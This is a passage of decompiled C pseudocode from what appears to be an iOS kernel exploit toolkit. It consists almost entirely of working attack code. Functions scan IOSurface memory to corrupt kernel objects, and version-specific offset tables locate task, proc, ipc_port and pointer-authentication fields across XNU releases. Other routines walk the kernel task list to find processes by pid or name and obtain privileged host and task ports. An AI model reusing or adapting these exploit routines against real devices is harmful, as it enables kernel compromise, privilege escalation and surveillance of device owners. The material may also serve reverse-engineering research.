  v13[0] = (unsigned int)(0x20000000 - krwCtx->pageSizeOrSomething);
  v13[1] = (uint64_t)payload;
  v13[2] = 112;
  if ( fcntl(v2, 59, v13) && errno == 1 )
    __error();
  return 0;
}

//----- (00000000000323C4) ----------------------------------------------------
__int64 __fastcall scan_iosurface_slot_realtime(__int64 a1)
{
  __int64 v2; // x20
  unsigned __int64 v3; // x21
  __int64 v4; // x22
  uint64_t *v5; // x23
  thread_act_t v6; // w0
  unsigned int v7; // w10
  unsigned int v8; // w9
  unsigned int v9; // w15
  uint64_t *v10; // x16
  bool v11; // zf
  unsigned __int64 v12; // x17
  bool v13; // cf
  __int64 v15; // x17
  __int64 v17; // x17
  int v18; // w16

  v2 = *(uint64_t *)(a1 + 8);
  v3 = *(uint64_t *)(a1 + 32);
  v4 = *(uint64_t *)(a1 + 48);
  v5 = *(uint64_t **)(a1 + 72);
  v6 = mach_thread_self();
  if ( set_thread_abs_realtime_50(v6) )
  {
    v7 = *(uint32_t *)(a1 + 56);
    v8 = v7 + 8;
    if ( !v7 )
    {
      v8 = 14080;
      v7 = 13056;
    }
    *(uint8_t *)a1 = 1;
    do
    {
      if ( v7 < v8 )
      {
        v9 = v7;
        while ( 1 )
        {
          v10 = (uint64_t *)(v2 + v9);
          v11 = *v10 >= 0xFFFF000000000001LL && (*v10 & v4) == 0;
          if ( v11 && !*((uint32_t *)v10 - 1) )
          {
            v12 = *(v10 - 2);
            v13 = v12 < v3 || v12 >= v3 + 0x4000;
            if ( !v13 && (*(v10 - 2) & 7LL) == 0 )
            {
              v15 = *(v10 - 2) & 0x3FFFLL;
              if ( !*(uint32_t *)(v2 + v15) && *(v10 - 3) >= 0xFFFF000000000001LL && (*(v10 - 3) & 0xFLL) == 0 )
              {
                v17 = v15 + 4;
                if ( (*(uint32_t *)(v2 + v17) & 0xFFFCC0F9) == 1 )
                  break;
              }
            }
          }
          v9 += 8;
          if ( v9 >= v8 )
            goto LABEL_29;
        }
        if ( v3 == *v5 )
        {
          *v10 = *(uint64_t *)(a1 + 16);
          if ( !*(uint8_t *)(a1 + 40) )
          {
            do
            {
              v18 = *(uint32_t *)(v2 + v17);
              if ( (v18 & 0x1000001) != 1 )
                break;
              if ( (v18 & 0x4000000) != 0 )
                *(uint32_t *)(v2 + v17) = v18 & 0xFBFFFFFF;
            }
            while ( !*(uint8_t *)(a1 + 1) );
          }
          *(uint8_t *)(a1 + 1) = 1;
          *(uint32_t *)(a1 + 60) = v9;
        }
        else
        {
          *(uint8_t *)(a1 + 1) = 1;
        }
      }
LABEL_29:
      ;
    }
    while ( !*(uint8_t *)(a1 + 1) );
  }
  return 0;
}

//----- (0000000000032538) ----------------------------------------------------
uint64_t *__fastcall alloc_physmap_page_aligned(struct_krwCtx *krwCtx, unsigned int *a2)
{
  unsigned int v4; // w8
  unsigned int v5; // w9
  int v6; // w10
  unsigned int v7; // w9
  unsigned int v8; // w21
  uint64_t *result; // x0

  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) && (v4 = *a2, *a2 >= 0x1FF9) )
  {
    v5 = krwCtx->pageSizeOrSomething;
    v6 = v4 % v5;
    v7 = v5 - v4 % v5;
    if ( !v6 )
      v7 = 0;
    v8 = v7 + v4;
    result = build_csblob_buf_from_load_cmds(krwCtx, v7 + v4);
    if ( result )
      *a2 = v8;
  }
  else
  {
    return (uint64_t *)alloc_physmap_page(krwCtx, a2);
  }
  return result;
}
// 325CC: variable 'vars8' is possibly undefined

//----- (00000000000325DC) ----------------------------------------------------
void __fastcall csblob_free_array(unsigned int *a1)
{
  unsigned __int64 v2; // x20
  __int64 v3; // x21

  if ( *a1 )
  {
    v2 = 0;
    v3 = 8;
    do
    {
      csblob_bzero_and_free(*(uint32_t **)(*((uint64_t *)a1 + 1) + v3));
      ++v2;
      v3 += 16;
    }
    while ( v2 < *a1 );
  }
  free(*((void **)a1 + 1));
  free(a1);
}
// 32640: variable 'vars8' is possibly undefined

//----- (0000000000032650) ----------------------------------------------------
__int64 __fastcall csblob_realloc_array(unsigned int *a1, int a2, __int64 a3)
{
  int v6; // w8
  unsigned int v7; // w9
  char *v8; // x0
  __int64 v9; // x22
  char *v10; // x9
  __int64 result; // x0

  v6 = *a1;
  v7 = a1[1];
  if ( *a1 < v7 )
  {
    v8 = (char *)*((uint64_t *)a1 + 1);
LABEL_5:
    v10 = &v8[16 * v6];
    *(uint32_t *)v10 = a2;
    *((uint64_t *)v10 + 1) = a3;
    result = (unsigned int)(v6 + 1);
    *a1 = result;
    return result;
  }
  v9 = 2 * v7;
  v8 = (char *)realloc(*((void **)a1 + 1), 16 * v9);
  if ( v8 )
  {
    a1[1] = v9;
    *((uint64_t *)a1 + 1) = v8;
    v6 = *a1;
    goto LABEL_5;
  }
  return 0xFFFFFFFFLL;
}

//----- (00000000000326D0) ----------------------------------------------------
uint64_t *csblob_alloc_container()
{
  uint64_t *v0; // x19
  void *v1; // x0

  v0 = malloc(0x10u);
  if ( v0 )
  {
    v1 = malloc(0x40u);
    if ( v1 )
    {
      v0[1] = v1;
      *v0 = 0x400000000LL;
    }
    else
    {
      free(v0);
      return 0;
    }
  }
  return v0;
}

//----- (000000000003272C) ----------------------------------------------------
__int64 __fastcall pread_loop(int __fd, __int64 a2, unsigned __int64 a3, __int64 a4)
{
  unsigned __int64 v8; // x26
  unsigned int v9; // w27
  ssize_t v10; // x0
  bool v11; // cf
  unsigned __int64 v12; // x8
  __int64 result; // x0
  int v14; // w19
  int v15; // w8

  if ( a3 )
  {
    v8 = 0;
    while ( 2 )
    {
      v9 = 0;
      while ( 1 )
      {
        v10 = pread(__fd, (void *)(a2 + v8), a3 - v8, v8 + a4);
        if ( v10 != -1 )
          break;
        if ( errno == 4 )
        {
          v11 = v9++ >= 0x64;
          if ( !v11 )
            continue;
        }
        goto LABEL_15;
      }
      v12 = v10;
      if ( v10 < 0 )
      {
LABEL_15:
        v14 = errno;
        v15 = errno;
        if ( v14 < 0 )
          v15 = -v15;
        return v15 | 0x40000000u;
      }
      result = 708628;
      if ( v12 > a3 )
        return result;
      v11 = __CFADD__(v12, v8);
      v8 += v12;
      if ( v11 || v8 > a3 )
        return result;
      if ( v8 < a3 )
        continue;
      break;
    }
  }
  return 0;
}

//----- (0000000000032820) ----------------------------------------------------
__int64 __fastcall ipc_port_kobject_field_offset(struct_krwCtx *krwCtx, __int64 ipc_port)
{
  __int64 result; // x0
  int xnuMajorVersion; // w8
  bool v5; // zf
  int v6; // w9
  __int64 v8; // x8

  result = 0LL;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion <= 8019 )
  {
    if ( xnuMajorVersion == 6153 || xnuMajorVersion == 7195 )
    {
      v8 = 104LL;
    }
    else
    {
      if ( xnuMajorVersion != 8019 )
        return result;
      v8 = 88LL;
    }
    return v8 + ipc_port;
  }
  if ( xnuMajorVersion > 8795 )
  {
    v5 = xnuMajorVersion == 8796;
    v6 = 10002;
  }
  else
  {
    v5 = xnuMajorVersion == 8020;
    v6 = 8792;
  }
  if ( v5 || xnuMajorVersion == v6 )
  {
    v8 = 72LL;
    return v8 + ipc_port;
  }
  return result;
}

//----- (00000000000328A4) ----------------------------------------------------
unsigned __int64 __fastcall maybe_ipc_port_get_kobject(struct_krwCtx *krwCtx, unsigned __int64 ipc_port_kaddr)
{
  unsigned __int64 result; // x0
  uint64_t xnuVersionPacked; // x8
  int v6; // [xsp+4h] [xbp-1Ch] BYREF
  __int64 v7; // [xsp+8h] [xbp-18h] BYREF

  if ( !kread_u32(krwCtx, ipc_port_kaddr, &v6) )
    return 0;
  result = ipc_port_kobject_field_offset(krwCtx, ipc_port_kaddr);
  if ( !result )
    return result;
  if ( !kread_physmap_decorated(krwCtx, result, (unsigned __int64 *)&v7) )
    return 0;
  result = validate_kaddr_range(krwCtx, v7);
  if ( !result )
    return result;
  xnuVersionPacked = krwCtx->xnuVersionPacked;
  if ( xnuVersionPacked >= XNU_VERSION_PACKED(10002, 0, 0, 0, 0) )
  {
    if ( (v6 & 0x3FFu) > 0x29 || ((1LL << v6) & 0x20068000000LL) == 0 )
      return v7;
    if ( !kread_physmap_decorated(krwCtx, v7 + 48, (unsigned __int64 *)&v7) )
      return 0;
    xnuVersionPacked = krwCtx->xnuVersionPacked;
  }
  if ( xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) || (v6 & 0x400) == 0 )
    return v7;
  if ( kread_physmap_decorated(krwCtx, v7 + krwCtx->stride_0x168, (unsigned __int64 *)&v7) )
  {
    result = validate_kaddr_range(krwCtx, v7);
    if ( !result )
      return result;
    return v7;
  }
  return 0;
}

//----- (00000000000329B8) ----------------------------------------------------
__int64 __fastcall get_task_struct_offset(struct_krwCtx *krwCtx, __int64 a2)
{
    switch ( krwCtx->xnuMajorVersion ) {
        case 6153:
            if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) )
                return a2 + 152;
            else
                return a2 + 144;
        case 7195:
            return a2 + 144;
        case 8019:
            return a2 + 128;
        case 8020:
        case 8792:
        case 8796:
        case 10002:
            return a2 + 112;
        default:
            return 0;
    }
}

//----- (0000000000032A64) ----------------------------------------------------
__int64 __fastcall get_ipc_port_offset_by_version(struct_krwCtx *krwCtx, __int64 a2)
{
    switch ( krwCtx->xnuMajorVersion ) {
        case 6153:
            if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) )
                return a2 + 168;
            else
                return a2 + 160;
        case 7195:
                return a2 + 160;
        case 8019:
            return a2 + 144;
        case 8020:
        case 8792:
        case 8796:
        case 10002:
            return a2 + 128;
        default:
            return 0;
    }
}

//----- (0000000000032B10) ----------------------------------------------------
__int64 __fastcall get_privileged_host_port(struct_krwCtx *krwCtx)
{
  host_t v2; // w0
  kern_return_t v3; // w19
  mach_msg_type_number_t info_outCnt; // [xsp+Ch] [xbp-24h] BYREF
  integer_t info_out; // [xsp+10h] [xbp-20h] BYREF
  host_t host; // [xsp+18h] [xbp-18h] BYREF
  processor_set_name_t default_set; // [xsp+1Ch] [xbp-14h] BYREF

  host = 0;
  info_outCnt = 2;
  if ( krwCtx->raw_0x4[6] && getuid() )
  {
    return mach_host_self();
  }
  else
  {
    v2 = mach_host_self();
    v3 = processor_set_default(v2, &default_set);
    if ( !v3 )
    {
      v3 = processor_set_info(default_set, 5, &host, &info_out, &info_outCnt);
      mach_port_deallocate(mach_task_self_, default_set);
    }
    if ( v3 == 53 )
      return mach_host_self();
    else
      return host;
  }
}

//----- (0000000000032BC8) ----------------------------------------------------
__int64 __fastcall get_task_struct_cached_offset(struct_krwCtx *krwCtx)
{
  __int64 v1; // x8
  int v2; // w9
  bool v3; // zf
  int v4; // w10

  v1 = krwCtx->gap_0x174;
  if ( (uint32_t)v1 )
    return v1;
  v2 = krwCtx->xnuMajorVersion;
  if ( v2 <= 8019 )
  {
    switch ( v2 )
    {
      case 6153:
        if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) )
          v1 = 176LL;
        else
          v1 = 168LL;
        break;
      case 7195:
        v1 = 168LL;
        break;
      case 8019:
        v1 = 160LL;
        break;
      default:
        return v1;
    }
LABEL_20:
    krwCtx->gap_0x174 = v1;
    return v1;
  }
  if ( v2 > 8795 )
  {
    v3 = v2 == 8796;
    v4 = 10002;
  }
  else
  {
    v3 = v2 == 8020;
    v4 = 8792;
  }
  if ( v3 || v2 == v4 )
  {
    v1 = 144LL;
    goto LABEL_20;
  }
  return v1;
}

//----- (0000000000032C78) ----------------------------------------------------
unsigned __int64 __fastcall get_task_kobject_addr(struct_krwCtx *krwCtx, mach_port_t a2)
{
  mach_port_t v4; // w21
  unsigned __int64 result; // x0
  bool v6; // zf

  v4 = mach_task_self_;
  if ( mach_task_self_ != a2 || (result = *(uint64_t *)&krwCtx->gap_0x1B0) == 0 )
  {
    if ( a2 == -1 )
    {
      return lookup_or_resolve_kaddr(krwCtx);
    }
    else
    {
      result = task_get_ipc_port(krwCtx, mach_task_self_, a2);
      if ( result )
      {
        result = maybe_ipc_port_get_kobject(krwCtx, result);
        v6 = v4 != a2 || result == 0;
        if ( !v6 && !*(uint64_t *)&krwCtx->gap_0x1B0 )
          *(uint64_t *)&krwCtx->gap_0x1B0 = result;
      }
    }
  }
  return result;
}
// 32D14: variable 'vars8' is possibly undefined

//----- (0000000000032D24) ----------------------------------------------------
unsigned __int64 __fastcall lookup_or_resolve_kaddr(struct_krwCtx *krwCtx)
{
  __int64 v1; // x8
  unsigned __int64 v3; // x1
  unsigned int v4; // w1

  v1 = krwCtx->gap_0x19D8;
  if ( v1 )
    return v1;
  v3 = krwCtx->gap_0x19D0_size8;
  if ( v3 )
    return maybe_ipc_port_get_kobject(krwCtx, v3);
  v4 = krwCtx->parentTaskPort;
  if ( v4 == -1 )
    return 0;
  if ( !v4 )
  {
    v4 = krwCtx->targetVmPort;
    if ( v4 + 1 < 2 )
      return 0;
  }
  return get_task_kobject_addr(krwCtx, v4);
}

//----- (0000000000032D6C) ----------------------------------------------------
unsigned __int64 __fastcall task_self_get_ipc_port(struct_krwCtx *krwCtx, mach_port_t port)
{
  return task_get_ipc_port(krwCtx, mach_task_self_, port);
}

//----- (0000000000032D80) ----------------------------------------------------
__int64 __fastcall get_task_struct_field_offset(struct_krwCtx *krwCtx, __int64 addr)
{
  __int64 result; // x0
  int xnuMajorVersion; // w8
  bool v5; // cc
  __int64 off; // x8
  __int64 v7; // x9
  __int64 out; // [xsp+8h] [xbp-18h] BYREF

  result = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion <= 8791 )
  {
    if ( (unsigned int)(xnuMajorVersion - 8019) < 2 )
    {
      v5 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
      off = 816;
      v7 = 776;
LABEL_16:
      if ( v5 )
        off = v7;
      goto LABEL_20;
    }
    if ( xnuMajorVersion != 6153 )
    {
      if ( xnuMajorVersion != 7195 )
        return result;
      v5 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023);
      off = 816;
      v7 = 824;
      goto LABEL_16;
    }
    off = 800;
LABEL_20:
    if ( !kread_physmap_decorated(krwCtx, off + addr, (unsigned __int64 *)&out) )
      return 0;
    if ( validate_kaddr_range(krwCtx, out) )
      return out;
    return 0;
  }
  if ( xnuMajorVersion == 8792 || xnuMajorVersion == 8796 || xnuMajorVersion == 10002 )
  {
    off = 768;
    goto LABEL_20;
  }
  return result;
}

//----- (0000000000032E84) ----------------------------------------------------
__int64 __fastcall get_task_pid_offset(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  int v3; // w9

  result = 0LL;
  v3 = krwCtx->xnuMajorVersion;
  if ( v3 > 8791 )
  {
    if ( v3 == 8792 || v3 == 8796 || v3 == 10002 )
      return 696LL;
  }
  else if ( (unsigned int)(v3 - 8019) < 2 )
  {
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      return 744LL;
    else
      return 704LL;
  }
  else if ( v3 == 6153 )
  {
    return 720LL;
  }
  else if ( v3 == 7195 )
  {
    return 736LL;
  }
  return result;
}

//----- (0000000000032F1C) ----------------------------------------------------
__int64 __fastcall task_proc_struct_field_offset(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  int xnuMajorVersion; // w8
  uint64_t xnuVersionPacked; // x20
  int has_flag; // w0
  unsigned int v6; // w9
  unsigned int v7; // w10
  bool v9; // cc
  unsigned int v10; // w8
  unsigned int v11; // w9
  int v12; // w0
  uint64_t v13; // x8
  bool v14; // cc
  unsigned int v15; // w8
  unsigned int v16; // w9

  result = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion <= 8791 )
  {
    if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 )
    {
      if ( xnuMajorVersion == 6153 )
      {
        if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
          return 904;
        else
          return 896;
      }
      else if ( xnuMajorVersion == 7195 )
      {
        xnuVersionPacked = krwCtx->xnuVersionPacked;
        has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK);
        if ( has_flag )
          v6 = 928;
        else
          v6 = 912;
        if ( has_flag )
          v7 = 944;
        else
          v7 = 920;
        if ( xnuVersionPacked >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
          return v7;
        else
          return v6;
      }
      return result;
    }
    if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15) )
    {
      v12 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK);
      v13 = krwCtx->xnuVersionPacked;
      v14 = v13 > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
      if ( v13 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
        v15 = 928;
      else
        v15 = 888;
      if ( v14 )
        v16 = 912;
      else
        v16 = 952;
      if ( v12 )
        return v16;
      else
        return v15;
    }
    v9 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
    v10 = 968;
    v11 = 928;
LABEL_27:
    if ( v9 )
      return v11;
    else
      return v10;
  }
  if ( xnuMajorVersion == 8792 )
  {
    v9 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 60, 50, 1023, 1023);
    v10 = 1328;
    v11 = 1336;
    goto LABEL_27;
  }
  if ( xnuMajorVersion == 8796 || xnuMajorVersion == 10002 )
    return 1840;
  return result;
}

//----- (0000000000033098) ----------------------------------------------------
__int64 __fastcall get_ptrauth_data_ptr_offset(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  int xnuMajorVersion; // w8

  result = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion <= 8795 )
  {
    if ( (unsigned int)(xnuMajorVersion - 8019) < 2 )
    {
      if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
        return 0;
      else
        return (unsigned int)task_proc_struct_field_offset(krwCtx) + 8;
    }
    if ( xnuMajorVersion != 8792 )
      return result;
    goto LABEL_11;
  }
  if ( xnuMajorVersion == 8796 || xnuMajorVersion == 10002 )
  {
LABEL_11:
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_A17_MASK) )
    {
      return 928;
    }
    else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
    {
      return 904;
    }
    else
    {
      return 880;
    }
  }
  return result;
}

//----- (0000000000033168) ----------------------------------------------------
__int64 __fastcall get_context_version_offset_40(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  int v3; // w9

  result = 0LL;
  v3 = krwCtx->xnuMajorVersion;
  if ( v3 <= 8795 )
  {
    if ( (unsigned int)(v3 - 8019) >= 2 && v3 != 8792 )
      return result;
LABEL_7:
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      return 0LL;
    else
      return 40LL;
  }
  if ( v3 == 10002 || v3 == 8796 )
    goto LABEL_7;
  return result;
}

//----- (00000000000331D0) ----------------------------------------------------
__int64 __fastcall get_context_version_offset_112(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  int v3; // w9

  result = 0LL;
  v3 = krwCtx->xnuMajorVersion;
  if ( v3 <= 8795 )
  {
    if ( (unsigned int)(v3 - 8019) >= 2 && v3 != 8792 )
      return result;
LABEL_7:
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      return 0LL;
    else
      return 112LL;
  }
  if ( v3 == 10002 || v3 == 8796 )
    goto LABEL_7;
  return result;
}

//----- (0000000000033238) ----------------------------------------------------
__int64 __fastcall get_version_adjusted_offset(struct_krwCtx *krwCtx)
{
  __int64 result; // x0

  result = get_context_version_offset_112(krwCtx);
  if ( (uint32_t)result )
    return (unsigned int)(result - krwCtx->stride_0x168);
  return result;
}

//----- (0000000000033268) ----------------------------------------------------
unsigned __int64 __fastcall get_ptrauth_base_offset(struct_krwCtx *krwCtx, unsigned int a2)
{
  int v4; // w0
  unsigned int v5; // w21
  unsigned __int64 result; // x0

  if ( krwCtx->xnuMajorVersion >= 8792 )
  {
    v4 = get_ptrauth_data_ptr_offset(krwCtx);
    if ( v4 )
    {
      v5 = v4 - krwCtx->stride_0x168;
      goto LABEL_5;
    }
    return 0;
  }
  v5 = task_proc_struct_field_offset(krwCtx);
  if ( !v5 )
    return 0;
LABEL_5:
  result = get_task_kobject_addr(krwCtx, a2);
  if ( result )
    result += v5 + ((__int64)krwCtx->stride_0x168 << (krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023)));
  return result;
}

//----- (0000000000033304) ----------------------------------------------------
__int64 __fastcall read_kaddr_at_task_offset(struct_krwCtx *krwCtx, __int64 a2)
{
  unsigned int v4; // w0
  __int64 v6; // [xsp+8h] [xbp-18h] BYREF

  v4 = task_proc_struct_field_offset(krwCtx);
  if ( !v4 )
    return 0;
  if ( krwCtx->xnuMajorVersion >= 8792 )
    return a2 - v4;
  if ( !kread_physmap_decorated(krwCtx, v4 + a2, (unsigned __int64 *)&v6) || !v6 )
    return 0;
  if ( validate_kaddr_range(krwCtx, v6) )
    return v6;
  return 0;
}

//----- (000000000003338C) ----------------------------------------------------
__int64 __fastcall get_task_context_size(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  int v3; // w10
  __int64 v4; // x9

  result = 0LL;
  v3 = krwCtx->xnuMajorVersion;
  v4 = 40LL;
  if ( v3 <= 8791 )
  {
    if ( (unsigned int)(v3 - 8019) >= 2 && v3 != 6153 )
    {
      if ( v3 != 7195 )
        return result;
      if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
        return 40LL;
      else
        return 32LL;
    }
    return v4;
  }
  if ( v3 == 8792 || v3 == 8796 || v3 == 10002 )
    return v4;
  return result;
}

//----- (0000000000033414) ----------------------------------------------------
__int64 __fastcall krw_task_for_pid_0(struct_krwCtx *krwCtx, __int64 a2, int pid)
{
  return krw_task_for_pid_or_name_ret_x0(krwCtx, a2, pid, 0);
}

//----- (000000000003341C) ----------------------------------------------------
__int64 __fastcall krw_task_for_pid_or_name_ret_x0(struct_krwCtx *krwCtx, __int64 a2, int pid, const char *a4)
{
  uint32_t xnuMajorVersion; // w8
  uint64_t pidOffset; // x24
  uint64_t nameOffset; // x25
  int taskContextSize; // w0
  uint32_t taskListNextOffset; // w23
  uint64_t dataBase; // x26
  uint64_t dataSize; // x8
  uint64_t dataEnd; // x20
  uint64_t taskListHead; // [xsp+8h] [xbp-88h] BYREF
  int taskPid; // [xsp+4h] [xbp-8Ch] BYREF
  SearchObj dataSegment; // [xsp+10h] [xbp-80h] BYREF

  xnuMajorVersion = krwCtx->xnuMajorVersion;
  pidOffset = 0;
  nameOffset = 0;
  if ( a4 )
  {
    if ( xnuMajorVersion == 8792 )
      nameOffset = 897;
    else if ( xnuMajorVersion == 8796 || xnuMajorVersion == 10002 )
      nameOffset = 1401;
    else
      return 0;
  }
  else if ( xnuMajorVersion == 8792 || xnuMajorVersion == 8796 || xnuMajorVersion == 10002 )
  {
    pidOffset = 96;
  }
  else if ( xnuMajorVersion == 6153 || xnuMajorVersion == 7195 || (unsigned int)(xnuMajorVersion - 8019) < 2 )
  {
    pidOffset = 104;
  }
  else
  {
    return 0;
  }

  taskContextSize = get_task_context_size(krwCtx);
  if ( !taskContextSize )
    return 0;

  dataBase = 0;
  dataSize = 0;
  dataEnd = 0;
  if ( krwCtx->kernelMachoCtx )
  {
    macho_walk_segment_by_name("__DATA", krwCtx->kernelMachoCtx, &dataSegment);
    dataBase = dataSegment.base_ptr;
    if ( !dataBase )
      return 0;
    dataSize = dataSegment.size;
    if ( !dataSize )
      return 0;
    if ( dataSegment.field_0x00 )
      dataEnd = dataBase + dataSize;
  }

  taskListNextOffset = (uint32_t)(krwCtx->stride_0x168 + taskContextSize);
  for ( int retry = 0; retry != 6; ++retry )
  {
    taskListHead = a2;
    while ( 1 )
    {
      uint64_t task = read_kaddr_at_task_offset(krwCtx, taskListHead);
      if ( task )
      {
        if ( a4 )
        {
          char buf[40];
          if ( !(unsigned int)krw_read_thunk(krwCtx, task + nameOffset, 33, (__int64)&buf) )
            return 0LL;
          if ( !strncmp((const char *)&buf, a4, 0x21u) )
            return taskListHead;
        }
        else
        {
          if ( !(unsigned int)krw_read_thunk(krwCtx, task + pidOffset, 4, (__int64)&taskPid) )
            return 0;
          if ( taskPid == pid )
            return taskListHead;
        }
      }

      if ( !kread_physmap_decorated(krwCtx, taskListHead + taskListNextOffset, &taskListHead) )
        return 0;
      taskListHead = validate_kaddr_range_reloaded(krwCtx, taskListHead);
      if ( !taskListHead )
        break;

      if ( dataEnd && taskListHead >= dataBase && taskListHead < dataEnd )
      {
        if ( !kread_physmap_decorated(krwCtx, taskListHead, &taskListHead) )
          return 0;
        taskListHead = validate_kaddr_range_reloaded(krwCtx, taskListHead);
        if ( !taskListHead )
          break;
      }

      if ( taskListHead == a2 )
        break;
    }
    semaphore_timedwait_ns(krwCtx, 0x3D090u);
  }
  return 0;
}

//----- (00000000000336AC) ----------------------------------------------------
__int64 __fastcall krw_task_for_name(struct_krwCtx *krwCtx, __int64 a2, const char *a3)
{
  return krw_task_for_pid_or_name_ret_x0(krwCtx, a2, 0, a3);
}

//----- (00000000000336B8) ----------------------------------------------------
__int64 __fastcall read_pte_entry_chain(struct_krwCtx *krwCtx, __int64 a2, uint32_t *a3, uint32_t *a4)
{
  __int64 result; // x0
  int xnuMajorVersion; // w8
  __int64 v11; // x23
  unsigned __int64 v14; // x1
  unsigned __int64 v15; // x1
  unsigned __int64 v16; // [xsp+0h] [xbp-40h] BYREF
  unsigned int v17; // [xsp+Ch] [xbp-34h] BYREF

  result = 0;
  v17 = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion > 8791 )
  {
    if ( xnuMajorVersion != 8792 && xnuMajorVersion != 10002 && xnuMajorVersion != 8796 )
      return result;
  }
  else if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 )
  {
    if ( xnuMajorVersion != 6153 && xnuMajorVersion != 7195 )
      return result;
    v11 = 20;
    goto LABEL_18;
  }
  v11 = 8;
LABEL_18:
  if ( !kread_physmap_decorated(krwCtx, a2 + 32, &v16) )
    return 0;
  v14 = v16;
  if ( !v16 )
    return 0;
  if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 40, 107, 1023, 1023) )
  {
    v14 = decode_pte_to_physmap_addr(krwCtx, v16, &v17);
    v16 = v14;
  }
  result = validate_kaddr_range(krwCtx, v14);
  v16 = result;
  if ( result )
  {
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8792, 40, 107, 1023, 1023) )
    {
      if ( krwCtx->xnuMajorVersion < 7938 )
        v15 = v11 + a2;
      else
        v15 = result + v11;
      if ( kread_u32(krwCtx, v15, &v17) )
        goto LABEL_30;
    }
    else if ( v17 )
    {
      v17 /= 0x18u;
LABEL_30:
      *a3 = v17;
      *a4 = 24;
      return v16;
    }
    return 0;
  }
  return result;
}

//----- (000000000003382C) ----------------------------------------------------
__int64 __fastcall setup_task_port_chain(struct_krwCtx *krwCtx, mach_port_name_t task, uint32_t *a3, uint32_t *a4)
{
  // struct_krwCtx *krwCtx; // x21
  uint64_t cachedTaskKaddr; // x1
  uint64_t selfPortKobject; // x23
  uint64_t taskListEntry; // x23
  uint64_t registeredTaskPort; // x0
  uint64_t registeredTaskPortOffset; // x8
  uint64_t taskKaddr; // x0
  mach_port_t init_port_set; // [xsp+4h] [xbp-3Ch] BYREF
  int pid; // [xsp+8h] [xbp-38h] BYREF

  if ( mach_task_self_ == task )
  {
    cachedTaskKaddr = krwCtx->gap_0x1A0;
    if ( cachedTaskKaddr )
      return read_pte_entry_chain(krwCtx, cachedTaskKaddr, a3, a4);
  }

  if ( !krwCtx->gap_0x19D0_size8 )
    return 0;
  selfPortKobject = maybe_ipc_port_get_kobject(krwCtx, krwCtx->gap_0x19D0_size8);
  if ( !selfPortKobject )
    return 0;

  if ( krwCtx->targetVmPort + 1 <= 1 )
  {
    pid = 0;
    if ( pid_for_task(task, &pid) )
      return 0;
    taskListEntry = krw_task_for_pid_or_name_ret_x0(krwCtx, selfPortKobject, pid, 0);
    if ( !taskListEntry )
      return 0;
  }
  else
  {
    init_port_set = task;
    if ( mach_ports_register(krwCtx->targetVmPort, &init_port_set, 1u) )
      return 0;

    if ( krwCtx->xnuMajorVersion == 6153 )
      registeredTaskPortOffset = 776;
    else if ( krwCtx->xnuMajorVersion == 7195 )
      registeredTaskPortOffset = 792;
    else
      return 0;

    registeredTaskPort = 0;
    if ( !kread_physmap_decorated(krwCtx, selfPortKobject + registeredTaskPortOffset, &registeredTaskPort) )
      return 0;
    registeredTaskPort = validate_kaddr_range_reloaded(krwCtx, registeredTaskPort);
    if ( !registeredTaskPort )
      return 0;
    taskListEntry = maybe_ipc_port_get_kobject(krwCtx, registeredTaskPort);
    if ( !taskListEntry )
      return 0;

    init_port_set = 0;
    if ( mach_ports_register(krwCtx->targetVmPort, &init_port_set, 1u) )
      return 0;
  }

